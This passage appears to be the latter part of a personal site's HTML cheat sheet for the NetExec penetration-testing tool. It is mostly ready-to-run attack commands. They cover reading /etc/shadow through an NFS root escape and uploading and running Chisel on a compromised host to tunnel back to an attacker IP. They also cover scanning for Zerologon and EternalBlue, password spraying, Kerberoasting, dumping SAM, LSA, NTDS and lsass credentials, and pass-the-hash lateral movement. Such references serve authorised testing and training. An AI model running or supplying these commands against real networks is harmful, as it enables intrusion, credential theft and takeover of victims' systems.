+
+## Command execution
+nxc wmi &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami'
+</code></pre>
+<hr />
+<h2 id="nfs-protocol">NFS Protocol</h2>
+<pre><code class="language-bash">## Enumerate NFS server and version
+nxc nfs &lt;TARGET&gt;
+## Output shows: Supported NFS versions and root escape status
+
+## Enumerate shares
+nxc nfs &lt;TARGET&gt; --shares
+
+## List files on a share
+nxc nfs &lt;TARGET&gt; --share '&lt;SHARE_PATH&gt;' --ls '/'
+
+## Enumerate all files recursively (default depth: 3)
+nxc nfs &lt;TARGET&gt; --enum-shares
+nxc nfs &lt;TARGET&gt; --enum-shares 5   # Custom depth
+
+## Download/upload files (via share)
+nxc nfs &lt;TARGET&gt; --share &lt;SHARE_PATH&gt; --get-file &lt;REMOTE&gt; &lt;LOCAL&gt;
+nxc nfs &lt;TARGET&gt; --share &lt;SHARE_PATH&gt; --put-file &lt;LOCAL&gt; &lt;REMOTE&gt;
+
+## Download/upload files (absolute path — uses root escape if available)
+nxc nfs &lt;TARGET&gt; --get-file /etc/shadow shadow.txt
+nxc nfs &lt;TARGET&gt; --put-file local.txt /remote/path
+
+## Root filesystem escape (if subtree_check not set)
+nxc nfs &lt;TARGET&gt; --ls '/'          # Lists root filesystem if escape is possible
+## Check /etc/exports for rw,no_root_squash for full read/write access
+</code></pre>
+<hr />
+<h2 id="vnc-protocol">VNC Protocol</h2>
+<pre><code class="language-bash">## Authentication
+nxc vnc &lt;TARGET&gt; -u '' -p '&lt;PASS&gt;'           # VNC often has no username
+nxc vnc &lt;TARGET&gt; --port &lt;PORT&gt;
+
+## Check for unauthenticated access
+nxc vnc &lt;TARGET&gt;                              # Shows (No Auth:True) if open
+
+## VNC sleep (prevent rate limiting)
+nxc vnc &lt;TARGET&gt; --vnc-sleep 5
+</code></pre>
+<hr />
+<h2 id="proxychains-chisel-integration">Proxychains + Chisel Integration</h2>
+<pre><code class="language-bash">## Use CME through a pivot host to reach internal networks
+## 1. Start Chisel server on attacker (reverse tunnel mode)
+./chisel server --reverse
+
+## 2. Upload Chisel to compromised host via CME
+nxc smb &lt;PIVOT_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
+
+## 3. Execute Chisel client on pivot host
+nxc smb &lt;PIVOT_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x &quot;C:\Windows\Temp\chisel.exe client &lt;ATTACKER_IP&gt;:8080 R:socks&quot;
+
+## 4. Configure proxychains (/etc/proxychains.conf → socks5 127.0.0.1 1080)
+## 5. Run CME through proxychains
+proxychains4 -q nxc smb &lt;INTERNAL_TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --shares
+
+## Alternative: Chisel server on target, client on attacker
+nxc smb &lt;PIVOT_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x &quot;C:\Windows\Temp\chisel.exe server --socks5&quot;
+sudo chisel client &lt;PIVOT_IP&gt;:8080 socks
+
+## Kill Chisel on target when done
+nxc smb &lt;PIVOT_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -X &quot;Stop-Process -Name chisel -Force&quot;
+</code></pre>
+<hr />
+<h2 id="quick-reference-pentest-workflow">Quick Reference — Pentest Workflow</h2>
+<pre><code class="language-bash">## 1. Host discovery + signing check
+nxc smb &lt;NETWORK&gt;/24 --gen-relay-list relay.txt
+
+## 2. Null session / guest check
+nxc smb &lt;TARGET&gt; -u '' -p '' --shares --users --pass-pol
+nxc smb &lt;TARGET&gt; -u 'guest' -p '' --shares
+
+## 3. Vulnerability scan
+nxc smb &lt;TARGET&gt; -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010
+nxc smb &lt;TARGET&gt; -u '' -p '' -M coerce_plus
+
+## 4. Password spray (after getting password policy!)
+nxc smb &lt;TARGET&gt; -u users.txt -p '&lt;PASS&gt;' --continue-on-success
+
+## 5. Enumerate with valid creds
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --shares --users
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --asreproast asrep.txt
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --kerberoasting kerb.txt
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --trusted-for-delegation
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --find-delegation
+
+## 6. Credential extraction (with admin)
+nxc smb &lt;TARGET&gt; -u &lt;ADMIN&gt; -p '&lt;PASS&gt;' --sam --lsa
+nxc smb &lt;DC_IP&gt; -u &lt;ADMIN&gt; -p '&lt;PASS&gt;' --ntds
+nxc smb &lt;TARGET&gt; -u &lt;ADMIN&gt; -p '&lt;PASS&gt;' -M lsassy
+nxc smb &lt;TARGET&gt; -u &lt;ADMIN&gt; -p '&lt;PASS&gt;' --dpapi
+
+## 7. Lateral movement (spray found creds)
+nxc smb &lt;NETWORK&gt;/24 -u &lt;USER&gt; -H '&lt;HASH&gt;' --continue-on-success
+</code></pre>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/Pennyw0rth/NetExec">NetExec GitHub</a></li>
+<li><a href="https://www.netexec.wiki/">NetExec Wiki</a></li>
+<li><a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec (legacy)</a></li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — tools & utilities / netexec · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
